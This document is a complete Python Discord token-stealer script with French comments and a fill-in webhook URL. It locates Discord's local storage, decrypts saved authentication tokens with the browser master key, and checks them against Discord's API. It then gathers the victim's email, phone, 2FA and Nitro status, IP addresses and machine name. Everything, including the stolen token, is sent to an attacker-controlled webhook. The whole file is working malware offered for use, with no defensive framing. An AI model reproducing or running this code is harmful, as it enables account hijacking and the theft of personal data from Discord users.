from base64 import b64decode
from Crypto.Cipher import AES
from win32crypt import CryptUnprotectData
from json import loads
from re import findall
from urllib.request import Request, urlopen
import requests, json, os
from datetime import datetime
import json
from urllib.error import HTTPError
import socket

cleaned = []
checker = []
already_checked = []
#Entrez ici votre l'url dde votre WEBHOOK
WEBHOOK_URL = 'WEBHOOK_URL'

def get_ip():
    try:
        ip = urlopen(Request("https://api.ipify.org")).read().decode().strip()
        return ip
    except Exception:
        return "None"


def get_local_ip():
    hostname = socket.gethostname()
    ip_local = socket.gethostbyname(hostname)
    return ip_local


def decrypt(buff, master_key):
    try:
        key = CryptUnprotectData(master_key, None, None, None, 0)[1]
        nonce = buff[3:15]
        cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
        decrypted = cipher.decrypt_and_verify(buff[15:-16], buff[-16:])
        return decrypted.decode()
    except Exception:
        return "Error"


def get_tokens(path):
    tokens = []
    leveldb_path = os.path.join(path, "Local Storage", "leveldb")

    if not os.path.exists(leveldb_path):
        print(f"Le chemin {leveldb_path} n'existe pas.")
        return tokens

    for root, dirs, files in os.walk(leveldb_path):
        for file in files:
            if file.endswith(".log") or file.endswith(".ldb"):
                file_path = os.path.join(root, file)
                try:
                    with open(file_path, "r", errors='ignore') as f:
                        for line in f:
                            tokens.extend(findall(r'dQw4w9WgXcQ:[^.*\["(.*)"\].*$][^"]*', line))
                except PermissionError:
                    print(f"PermissionError: Impossible de lire le fichier {file_path}")
                except Exception as e:
                    print(f"Erreur lors de la lecture du fichier {file_path}: {e}")

    return tokens


path = os.path.join(os.getenv("APPDATA"), "Discord")
tokens = get_tokens(path)
#Vérification du bon fonctionnement du token grab avec le print
print(tokens)

with open(os.path.join(path, "Local State"), 'r') as file:
    key = loads(file.read())['os_crypt']['encrypted_key']

for i in tokens:
    if i.endswith("\\"):
        i = i.replace("\\", "")
    if i not in cleaned:
        cleaned.append(i)

for token in cleaned:
    try:
        tok = decrypt(b64decode(token.split('dQw4w9WgXcQ')[1]), b64decode(key)[5:])
        checker.append(tok)
    except IndexError:
        continue

res_json = None
for value in checker:
    if value not in already_checked:
        already_checked.append(value)
        headers = {'Authorization': value, 'Content-Type': 'application/json'}
        try:
            res = requests.get("https://discordapp.com/api/v6/users/@me", headers=headers)
            if res.status_code == 200:
                res_json = res.json()
                print(res.json())
        except Exception as e:
            print(f"Erreur lors de la récupération des informations de l'utilisateur: {e}")

def send_values():
    if res_json:
        pc_username = os.getenv("PC_USERNAME")
        pc_name = os.getenv("COMPUTERNAME")
        headers2 = {
            'Content-Type': 'application/json',
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Firefox/126.0.0.0 Safari/537.11'#a modifier en fonction de vos versions
        }
        user_name = f'{res_json["username"]}#{res_json["discriminator"]}'
        user_id = res_json['id']
        email = res_json['email']
        phone = res_json['phone']
        ip = get_ip()
        ip_local = get_local_ip()
        mfa_enabled = res_json['mfa_enabled']
        has_nitro = False
        res = requests.get('https://discordapp.com/api/v6/users/@me/billing/subscriptions', headers=headers)
        nitro_data = res.json()
        has_nitro = bool(len(nitro_data) > 0)
        days_left = 0
        if has_nitro:
            d1 = datetime.strptime(nitro_data[0]["current_period_end"].split('.')[0], "%Y-%m-%dT%H:%M:%S")
            d2 = datetime.strptime(nitro_data[0]["current_period_start"].split('.')[0], "%Y-%m-%dT%H:%M:%S")
            days_left = abs((d2 - d1).days)
        embed = f"""**{user_name}** *({user_id})*\n
                                        > :file_folder: __Account Information__\n\tEmail: `{email}`\n\tPhone: `{phone}`\n\t2FA/MFA Enabled: `{mfa_enabled}`\n\tNitro: `{has_nitro}`\n\tExpires in: `{days_left if days_left else "None"} day(s)`\n
                                        > :desktop: __PC Information__\n\tIP (connection): `{ip}`\n\tIP (machine): `{ip_local}`\n\tUsername: `{pc_username}`\n\tPC Name: `{pc_name}`\n
                                        > :smiling_imp: __Token__\n\t`{value}`\n
                                """
        payload = json.dumps({'content': embed, 'username': 'Made by m1cr0'})
        try:
            req = Request(WEBHOOK_URL, data=payload.encode(), headers=headers2, method='POST')
            try:
                re = urlopen(req)
                print(re.status)
            except HTTPError as e:
                print('ERROR')
                print(e.reason)
                print(e.hdrs)
                print(e.file.read())
        except Exception as e:
            print(f"Erreur lors de l'envoi des valeurs: {e}")


if __name__ == '__main__':
    send_values()